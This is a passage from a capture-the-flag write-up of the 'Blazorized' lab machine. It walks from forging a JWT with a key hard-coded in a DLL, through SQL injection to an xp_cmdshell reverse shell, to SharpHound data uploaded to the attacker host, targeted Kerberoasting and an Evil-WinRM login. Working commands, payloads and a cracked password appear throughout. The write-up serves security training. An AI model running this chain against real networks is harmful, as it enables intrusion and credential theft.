+</span><span id="__span-2-95"><a id="__codelineno-2-95" name="__codelineno-2-95" href="#__codelineno-2-95"></a><span class="go">    },</span>
+</span><span id="__span-2-96"><a id="__codelineno-2-96" name="__codelineno-2-96" href="#__codelineno-2-96"></a><span class="go">    &quot;runtimeAssets&quot;: {</span>
+</span><span id="__span-2-97"><a id="__codelineno-2-97" name="__codelineno-2-97" href="#__codelineno-2-97"></a><span class="go">      &quot;dotnet.wasm&quot;: {</span>
+</span><span id="__span-2-98"><a id="__codelineno-2-98" name="__codelineno-2-98" href="#__codelineno-2-98"></a><span class="go">        &quot;behavior&quot;: &quot;dotnetwasm&quot;,</span>
+</span><span id="__span-2-99"><a id="__codelineno-2-99" name="__codelineno-2-99" href="#__codelineno-2-99"></a><span class="go">        &quot;hash&quot;: &quot;sha256-fMuaMGy\/7q8rXL+GyH9Gu04mJDwQ\/OSYXD9ezf+Fz4k=&quot;</span>
+</span><span id="__span-2-100"><a id="__codelineno-2-100" name="__codelineno-2-100" href="#__codelineno-2-100"></a><span class="go">      }</span>
+</span><span id="__span-2-101"><a id="__codelineno-2-101" name="__codelineno-2-101" href="#__codelineno-2-101"></a><span class="go">    },</span>
+</span><span id="__span-2-102"><a id="__codelineno-2-102" name="__codelineno-2-102" href="#__codelineno-2-102"></a><span class="go">    &quot;satelliteResources&quot;: null</span>
+</span><span id="__span-2-103"><a id="__codelineno-2-103" name="__codelineno-2-103" href="#__codelineno-2-103"></a><span class="go">  }</span>
+</span><span id="__span-2-104"><a id="__codelineno-2-104" name="__codelineno-2-104" href="#__codelineno-2-104"></a><span class="go">}</span>
+</span></code></pre></div>
+<p>We download the discovered files, most importantly the <code>Blazorized.Helpers.dll</code> file using <code>curl</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>$ curl -s &#39;http://blazorized.htb/_framework/Blazorized.Helpers.dll&#39; -o Blazorized.Helpers.dll
+</span></code></pre></div>
+<h2 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h2>
+<h3 id="decompiling-dlls">Decompiling DLLs<a class="headerlink" href="#decompiling-dlls" title="Permanent link">&para;</a></h3>
+<p>Spin up a Windows host to use <code>dnSpy</code> to decompile the DLL files. Once decompiled we will find very interesting information saved at the <code>JWT</code> class for the <code>Blazorized.Helpers.dll</code> file. It has the JWT security key hard-coded as a variable as well as the claims as the class' member variables.</p>
+<p><img alt="Blazorized-2.png" src="../images/Blazorized-2.png" /></p>
+<p>Furthermore we discover the algorithm used for the JWT through the <code>VerifyJWT</code> function.</p>
+<p><img alt="Blazorized-3.png" src="../images/Blazorized-3.png" /></p>
+<p>We can also find out what exact values we need in order to craft a Super Admin JWT by looking at the <code>GenerateSuperAdminJWT</code> function.</p>
+<p><img alt="Blazorized-4.png" src="../images/Blazorized-4.png" /></p>
+<h3 id="generate-jwt">Generate JWT<a class="headerlink" href="#generate-jwt" title="Permanent link">&para;</a></h3>
+<p>We now have all the information needed to generate a Super Admin JWT. We know the values for the <code>iss</code> and <code>aud</code> registered claims as well as the custom claims values for <code>role</code> and <code>emailaddress</code>. In addition we have the security key and the encryption algorithm. The last thing needed is to convert the expiration date of the JWT to <code>epoch</code> format.</p>
+<p>To generate the JWT with this information, we use the <a href="https://jwt.io/">jwt.io</a>.</p>
+<p><img alt="Blazorized-5.png" src="../images/Blazorized-5.png" /></p>
+<p>We add all the information, the to-epoch converted expiration date of the JWT and the secret key under <code>VERIFY SIGNATURE</code>. Next copy the encoded token and add it to our local storage in our browser for the <code>http://admin.blazorized.htb</code> website.</p>
+<p><img alt="Blazorized-6.png" src="../images/Blazorized-6.png" /></p>
+<p>Upon refreshing the page we successfully get authenticated to the Super Admin Panel.</p>
+<h3 id="sql-injection">SQL Injection<a class="headerlink" href="#sql-injection" title="Permanent link">&para;</a></h3>
+<p>We enumerate the newly unlocked functionalities and eventually find an SQL Injection vulnerability for the <code>Check Duplicate Category Names</code> functionality.</p>
+<p>If we enter some expected category name, we get the expected response:</p>
+<p><img alt="Blazorized-7.png" src="../images/Blazorized-7.png" /></p>
+<p>However using the following payload (<code>sqli' 1=1-- -</code>), we can confirm SQL injection as being possible, since it retrieved all the category names.</p>
+<p><img alt="Blazorized-8.png" src="../images/Blazorized-8.png" /></p>
+<p>Since we know this is an MSSQL database, we continue by trying to execute commands using the <code>xp_cmdshell</code> in hopes that we are a privileged user to do so. We find out it is already enabled so we continue with preparing a payload in order to obtain a reverse shell connection.</p>
+<p>We craft a <code>base64</code> encoded PowerShell command using <a href="https://www.revshells.com/">revshells</a> and start our listener on our attack host. Next we issue the payload <code>sqli'; EXEC xp_cmdshell 'powershell.exe -e &lt;BASE64&gt;'-- -</code>.</p>
+<p><img alt="Blazorized-9.png" src="../images/Blazorized-9.png" /></p>
+<p>And we successfully get a reverse shell connection established on the <code>DC1</code> host as domain user <code>nu_1055</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>$ rlwrap -cAr nc -lvnp 6666
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>listening on [any] 6666 ...
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>connect to [10.10.16.33] from (UNKNOWN) [10.129.231.74] 60584
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>PS C:\Windows\system32&gt; whoami
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>blazorized\nu_1055
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>PS C:\Windows\system32&gt; hostname
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>DC1
+</span></code></pre></div>
+<p>The user flag can now be found at <code>C:\Users\NU_1055\Desktop\user.txt</code></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>PS C:\&gt; type C:\Users\NU_1055\Desktop\user.txt
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>d85aff2be64c6b9e0252787ba15d6fcb
+</span></code></pre></div>
+<h2 id="ad-exploitation">AD Exploitation<a class="headerlink" href="#ad-exploitation" title="Permanent link">&para;</a></h2>
+<p>We start a web server on our attack host to transfer over the <code>SharpHound</code> tool in order to gather information about the Active Directory domain.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>$ python3 -m http.server 1080
+</span></code></pre></div>
+<p>And we download it to the victim host using <code>curl</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>PS C:\Programdata\xpltive&gt; curl http://10.10.16.33:1080/SharpHound.exe -o SharpHound.exe
+</span></code></pre></div>
+<p>Next we run it to collect all the information and save it as a ZIP file.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>PS C:\Programdata\xpltive&gt; .\SharpHound.exe -c All --zipfilename blazorized
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>2025-01-17T17:35:48.0030205-06:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>2025-01-17T17:35:48.1749202-06:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>2025-01-17T17:35:48.2061451-06:00|INFORMATION|Initializing SharpHound at 5:35 PM on 1/17/2025
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>2025-01-17T17:35:48.3155085-06:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for blazorized.htb : DC1.blazorized.htb
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>2025-01-17T17:35:48.4405138-06:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>2025-01-17T17:35:48.5967695-06:00|INFORMATION|Beginning LDAP search for blazorized.htb
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>2025-01-17T17:35:48.6436574-06:00|INFORMATION|Producer has finished, closing LDAP channel
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>2025-01-17T17:35:48.6436574-06:00|INFORMATION|LDAP channel closed, waiting for consumers
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>2025-01-17T17:36:18.7530508-06:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>2025-01-17T17:36:34.6748818-06:00|INFORMATION|Consumers finished, closing output channel
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>2025-01-17T17:36:34.7061341-06:00|INFORMATION|Output channel closed, waiting for output task to complete
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>Closing writers
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>2025-01-17T17:36:34.8936755-06:00|INFORMATION|Status: 110 objects finished (+110 2.391304)/s -- Using 43 MB RAM
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>2025-01-17T17:36:34.8936755-06:00|INFORMATION|Enumeration finished in 00:00:46.3006387
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>2025-01-17T17:36:34.9717551-06:00|INFORMATION|Saving cache with stats: 70 ID to type mappings.
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a> 70 name to SID mappings.
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a> 0 machine sid mappings.
+</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a> 2 sid to domain mappings.
+</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a> 0 global catalog mappings.
+</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a>2025-01-17T17:36:34.9873843-06:00|INFORMATION|SharpHound Enumeration Completed at 5:36 PM on 1/17/2025! Happy Graphing!
+</span></code></pre></div>
+<p>And we start an upload server on our attack host in order to transfer the ZIP from the victim to us.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>$ python3 -m uploadserver 1081
+</span></code></pre></div>
+<p>Finally we transfer the ZIP file containing the domain information over using <code>curl</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>PS C:\Programdata\xpltive&gt; cmd /c curl -X POST -F &quot;files=@20250117173634_blazorized.zip&quot; http://10.10.16.33:1081/upload
+</span></code></pre></div>
+<p>Importing the ZIP archive into our <code>BloodHound</code> application, we see that we have <code>WriteSPN</code> rights on user <code>rsa_4810</code>.</p>
+<p><img alt="Blazorized-10.png" src="../images/Blazorized-10.png" /></p>
+<h3 id="targeted-kerberoasting-lateral-movement-to-rsa_4810">Targeted Kerberoasting &amp; Lateral Movement to rsa_4810<a class="headerlink" href="#targeted-kerberoasting-lateral-movement-to-rsa_4810" title="Permanent link">&para;</a></h3>
+<p>We can abuse this configuration by performing a targeted Kerberoasting attack. To do so we first have to transfer over <code>PowerView</code> to the victim host. After doing so we use the <code>Set-DomainObject</code> functionality of it to set a "bogus" service principal name to the <code>rsa_4810</code> user. This in turn allows us to request the Kerberos TGS ticket of the user (using <code>Get-DomainSPNTicket</code> function) and finally attempt to crack it to obtain clear-text credentials.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>PS C:\Programdata\xpltive&gt; Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname=&#39;doesnt/MATTER&#39;}
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>PS C:\Programdata\xpltive&gt; Get-DomainUser -Identity rsa_4810 -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Select-Object -ExpandProperty Hash                                                                                                                                       
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>$krb5tgs$23$*RSA_4810$blazorized.htb$doesnt/MATTER*$B443879BFD6B5AE278B97BCC90779BE9$D9434675A5263EE085C9F815E963EECD15C25478ADACA311549185B767A17450BC07EFCF764D52AE2CE1AE8BC5612F4140A4CB0C15760F59709EEE9550545644C95215D4CAD77DEBB84FB032AED0D863DE47842546A72B077D14928F1DF224788D372BD5FAF1633D981ECC2F12439CF1F290323AF244AF70230825B0EA26D13154A6A37360706089343E2C644515E08EA204D3EF7935FB26DA513AD5672084127A0093B2CB238C8C227ADFF53FB18255E745A32790706F1780EEA99B19F2C072C4802FFB8F00867B32E3EB0656D81B5D0A9432531E6599C0C05E0154B5DF565EEB8E48774C5FA64856E104CD87F4059FD8452C7E7306413612FF0E339EBAE665B33346919806C9E10AAAA10D128B475A063BD1259710F1C5DFA308B2CE97EA3F3358688015CDAF54AC2F8555D3A4AEE0761B4FB8A184681C6204034C0F0117E035B1866EBF76AEFF1FEAAC16107DE6A0EFF6255953C9F2516A427878B55D75A0FF1AB6E0CC2E878198531008E9FB7781FFAA50A8030DAEC1470B5B348CF7760E06184F2EA36C6B29FB1CAC4B88E7AADE2C813C462062698F82AD5C36855E1738A739BCB52A16EFD0119228F4F7B370089AEC9476E1E556E4EC021D0164905F1D7D2945FC1CC939AB77EF59431FA17498BBBD956B3E8111CCFB71146D5A4A2FAB53A43F5D44A7E8279E786B0819EF69CD3B00574D6908BF3AD565B24876242D6BA95B04CBB326F38BE2108B049136AF294E5ECA0C1F0254E397FE8C7DC579F607C9720AA4B4FEF8AE8EA6B2DFCDC1542C958568B9B47DAE8B4BAFB6E742B6D8174DFEE1D653B3D0E496E0DC0A8B7961B72A73993F3B82FAB9B59DD6FC7D527A1ECF38146DC646B32A48DACCA8844F6E6A9CECC06FEF3EDA464FBBDF00BDB27C6D29718535D77BA6F9C0D45410634878CF86A88C2BF8CF8C7D2AD007A2152826C656E822384D00D93176FF4A23742483E2E3D1E097C76FEE190431F83239440A87ECC3526698D136DC1D58221D387DB4432F122D5633706D0357D3F0D0F97DBB43B505B6775164502AFFD20B0DB63B7B68E9AC35A831F62A2420A63288940267E29A072A2E253F8E0FA3DD9EC4F8ABFA7B6D0BCF9F9D8450FF6F0F249D5940067B53BD1CFC677A576E1632BCA45F0CF158321FBC82EECC75A1A192CCF6A488A2C6AB7F70CF8C5A6CAEA093889CC490934353DF20D1EE40A8BF90B16A28802FCEE23774B9FFE81B29AF5E443F5656A68589B717F3B0523C82E7918097C9BE1832BB9CD60521374A2C2C276B8393A3990F605EFF98D5113C7CE8928FF25B562623CB9A1255DDF8E0E5F3D0DF44D180CBC9F88952FD64BFDA2E4B2B2D00EB46337069D6320D77900391D98D107CC5D2E85468B5824D51E15C8633F70CB3FB870A36A53AE195D428F5D8E5B032995E9D5CAE7CF21DA3338F8787706F00C7B849C7E2A7EA9DC31B7363F8BBE3F71CF02114BEDB7DF24E382795A36D6666B16B18A6CD716178E8AF317DA4F8120ACDF4BD3D11EBA8941964F3268B31B3E978E3E735ACBC27427B704FFC6E7D6A980B05B94E205A860140DA39303D72D91C41A2360888F36DAD34763394CA1B5D836CE0E11CAD88BA0FDD46DBD86BA078FEAA7EF568F0F07FAA6337125AFAF404AA0B1543029F2FB65DE5CDF95CC1C7FDB2AC7D8653DB9AABB20CCF8B2EF370E21CD7E0E96CEFE4057A431332BF35D61CBFB55279C094266F7BCF6633FDC4B29E039F8374A731BD3C99A2FB597CDA3C2D1C5B5CF17B15727AB2EB6D5D428E83
+</span></code></pre></div>
+<p>We copy the TGS ticket obtained and crack it using <code>Hashcat</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>$ ./hashcat --identify hashes/blazorized/rsa_4810.tgs
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>&lt;--SNIP--&gt;
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>$krb5tgs$23$*RSA_4810$blazorized.htb$doesnt/MATTER*$b443879bfd6b5ae278b97bcc90779be9$d9434675a5263ee085c9f815e963eecd15c25478adaca311549185b767a17450bc07efcf764d52ae2ce1ae8bc5612f4140a4cb0c15760f59709eee9550545644c95215d4cad77debb84fb032aed0d863de47842546a72b077d14928f1df224788d372bd5faf1633d981ecc2f12439cf1f290323af244af70230825b0ea26d13154a6a37360706089343e2c644515e08ea204d3ef7935fb26da513ad5672084127a0093b2cb238c8c227adff53fb18255e745a32790706f1780eea99b19f2c072c4802ffb8f00867b32e3eb0656d81b5d0a9432531e6599c0c05e0154b5df565eeb8e48774c5fa64856e104cd87f4059fd8452c7e7306413612ff0e339ebae665b33346919806c9e10aaaa10d128b475a063bd1259710f1c5dfa308b2ce97ea3f3358688015cdaf54ac2f8555d3a4aee0761b4fb8a184681c6204034c0f0117e035b1866ebf76aeff1feaac16107de6a0eff6255953c9f2516a427878b55d75a0ff1ab6e0cc2e878198531008e9fb7781ffaa50a8030daec1470b5b348cf7760e06184f2ea36c6b29fb1cac4b88e7aade2c813c462062698f82ad5c36855e1738a739bcb52a16efd0119228f4f7b370089aec9476e1e556e4ec021d0164905f1d7d2945fc1cc939ab77ef59431fa17498bbbd956b3e8111ccfb71146d5a4a2fab53a43f5d44a7e8279e786b0819ef69cd3b00574d6908bf3ad565b24876242d6ba95b04cbb326f38be2108b049136af294e5eca0c1f0254e397fe8c7dc579f607c9720aa4b4fef8ae8ea6b2dfcdc1542c958568b9b47dae8b4bafb6e742b6d8174dfee1d653b3d0e496e0dc0a8b7961b72a73993f3b82fab9b59dd6fc7d527a1ecf38146dc646b32a48dacca8844f6e6a9cecc06fef3eda464fbbdf00bdb27c6d29718535d77ba6f9c0d45410634878cf86a88c2bf8cf8c7d2ad007a2152826c656e822384d00d93176ff4a23742483e2e3d1e097c76fee190431f83239440a87ecc3526698d136dc1d58221d387db4432f122d5633706d0357d3f0d0f97dbb43b505b6775164502affd20b0db63b7b68e9ac35a831f62a2420a63288940267e29a072a2e253f8e0fa3dd9ec4f8abfa7b6d0bcf9f9d8450ff6f0f249d5940067b53bd1cfc677a576e1632bca45f0cf158321fbc82eecc75a1a192ccf6a488a2c6ab7f70cf8c5a6caea093889cc490934353df20d1ee40a8bf90b16a28802fcee23774b9ffe81b29af5e443f5656a68589b717f3b0523c82e7918097c9be1832bb9cd60521374a2c2c276b8393a3990f605eff98d5113c7ce8928ff25b562623cb9a1255ddf8e0e5f3d0df44d180cbc9f88952fd64bfda2e4b2b2d00eb46337069d6320d77900391d98d107cc5d2e85468b5824d51e15c8633f70cb3fb870a36a53ae195d428f5d8e5b032995e9d5cae7cf21da3338f8787706f00c7b849c7e2a7ea9dc31b7363f8bbe3f71cf02114bedb7df24e382795a36d6666b16b18a6cd716178e8af317da4f8120acdf4bd3d11eba8941964f3268b31b3e978e3e735acbc27427b704ffc6e7d6a980b05b94e205a860140da39303d72d91c41a2360888f36dad34763394ca1b5d836ce0e11cad88ba0fdd46dbd86ba078feaa7ef568f0f07faa6337125afaf404aa0b1543029f2fb65de5cdf95cc1c7fdb2ac7d8653db9aabb20ccf8b2ef370e21cd7e0e96cefe4057a431332bf35d61cbfb55279c094266f7bcf6633fdc4b29e039f8374a731bd3c99a2fb597cda3c2d1c5b5cf17b15727ab2eb6d5d428e83:(Ni7856Do9854Ki05Ng0005 #)
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>&lt;--SNIP--&gt;
+</span></code></pre></div>
+<p>It successfully cracks with the password <code>(Ni7856Do9854Ki05Ng0005 #)</code>. The compromised user <code>rsa_4810</code> is also part of the <code>REMOTE MANAGEMENT USERS</code> group and thus we can authenticate via <code>WinRM</code> to the <code>DC1</code> host (discovered during <code>Nmap</code> scan).</p>
+<p><img alt="Blazorized-11.png" src="../images/Blazorized-11.png" /></p>
+<p>We will use <code>Evil-WinRM</code> to establish the connection.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>$ evil-winrm -i dc1.blazorized.htb -u rsa_4810 -p &#39;(Ni7856Do9854Ki05Ng0005 #)&#39;
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>Evil-WinRM shell v3.7
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>Info: Establishing connection to remote endpoint
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; whoami
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>blazorized\rsa_4810
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; hostname
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>DC1
+</span></code></pre></div>
+<h3 id="writing-logon-script-lateral-movement-to-ssa_6010">Writing Logon Script &amp; Lateral Movement to ssa_6010<a class="headerlink" href="#writing-logon-script-lateral-movement-to-ssa_6010" title="Permanent link">&para;</a></h3>
+<p>Having code execution as domain user <code>rsa_4810</code>, we go back to our <code>BloodHound</code> data and also discover the compromised user as being in a non-standard group called <code>REMOTE_SUPPORT_ADMINISTRATORS</code>.</p>
+<p><img alt="Blazorized-12.png" src="../images/Blazorized-12.png" /></p>
+<p>We don't get far by using just the imported <code>BloodHound</code> data, however this hints at some other configuration within the Active Directory environment we might be able to abuse.</p>
+<p>We continue with using <code>PowerView</code> with the compromised user to get an insight about all the ACL's they have access to.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>*Evil-WinRM* PS C:\ProgramData\xpltive&gt; Import-Module .\PowerView.ps1
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>*Evil-WinRM* PS C:\ProgramData\xpltive&gt; $rsa_4810_sid = Convert-NameToSid rsa_4810
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>*Evil-WinRM* PS C:\ProgramData\xpltive&gt; Get-DomainObjectAcl -Identity * -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $rsa_4810_sid}
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>AceType               : AccessAllowed
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>ObjectDN              : CN=NU_1055,CN=Users,DC=blazorized,DC=htb
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>ActiveDirectoryRights : ReadProperty, GenericExecute
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>OpaqueLength          : 0
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>ObjectSID             : S-1-5-21-2039403211-964143010-2924010611-1117
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>InheritanceFlags      : None
+</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>BinaryLength          : 36
+</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>IsInherited           : False
+</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>IsCallback            : False
+</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>PropagationFlags      : None
+</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>SecurityIdentifier    : S-1-5-21-2039403211-964143010-2924010611-1107
+</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>AccessMask            : 131092
+</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>AuditFlags            : None
+</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>AceFlags              : None
+</span><span id="__span-14-20"><a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a>AceQualifier          : AccessAllowed
+</span><span id="__span-14-21"><a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a>
+</span><span id="__span-14-22"><a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a>AceQualifier           : AccessAllowed
+</span><span id="__span-14-23"><a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a>ObjectDN               : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
+</span><span id="__span-14-24"><a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>ActiveDirectoryRights  : WriteProperty
+</span><span id="__span-14-25"><a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a>ObjectAceType          : Script-Path
+</span><span id="__span-14-26"><a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a>ObjectSID              : S-1-5-21-2039403211-964143010-2924010611-1124
+</span><span id="__span-14-27"><a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a>InheritanceFlags       : None
+</span><span id="__span-14-28"><a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a>BinaryLength           : 56
+</span><span id="__span-14-29"><a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a>AceType                : AccessAllowedObject
+</span><span id="__span-14-30"><a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a>ObjectAceFlags         : ObjectAceTypePresent
+</span><span id="__span-14-31"><a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a>IsCallback             : False
+</span><span id="__span-14-32"><a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a>PropagationFlags       : None
